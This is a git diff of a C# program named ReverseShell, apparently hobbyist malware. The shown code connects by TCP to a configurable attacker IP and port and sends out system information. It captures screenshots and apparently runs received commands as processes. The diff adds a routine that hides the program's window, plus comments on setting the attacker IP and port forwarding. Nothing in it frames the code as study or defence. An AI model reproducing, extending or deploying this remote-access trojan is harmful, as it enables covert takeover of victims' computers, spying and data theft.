@@ -9,9 +9,30 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms; 
+using System.Runtime.InteropServices;
+
+
 
 class ReverseShell
 {
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+    const int SW_SHOW = 5;
+
+    static void HideWindow()
+    {
+        IntPtr hWnd = FindWindow(null, "made by daimy");
+        if (hWnd != IntPtr.Zero)
+        {
+            ShowWindow(hWnd, SW_HIDE);
+        }
+    }
     static string GetSystemInfo()
     {
         string info = "[SYSTEM INFO]\n";
@@ -137,19 +158,21 @@ class ReverseShell
 
     static void Main()
     {
-        string attackerIP = "127.0.0.1";
-        int attackerPort = 4444;
+        HideWindow();
+
+        string attackerIP = "127.0.0.1"; //change this to your ip (127.0.0.1 works on local host only)
+        int attackerPort = 3000; // make sure this is port forwarded: https://www.canyouseeme.org
 
         try
         {
-            //Console.WriteLine("[+] Attempting to connect to server..."); 
+            Console.WriteLine("[+] Attempting to connect to server..."); 
             using (TcpClient client = new TcpClient(attackerIP, attackerPort))
             using (NetworkStream stream = client.GetStream())
             using (StreamReader reader = new StreamReader(stream))
             using (StreamWriter writer = new StreamWriter(stream))
             {
                 writer.AutoFlush = true;
-                //Console.WriteLine("[+] Connected to server."); 
+                Console.WriteLine("[+] Connected to server."); 
 
                 string systemInfo = GetSystemInfo();
                 writer.WriteLine(systemInfo);
@@ -174,6 +197,7 @@ class ReverseShell
                     {
                         CaptureScreenshot(writer);
                     }
+
                     else
                     {
                         Process proc = new Process();
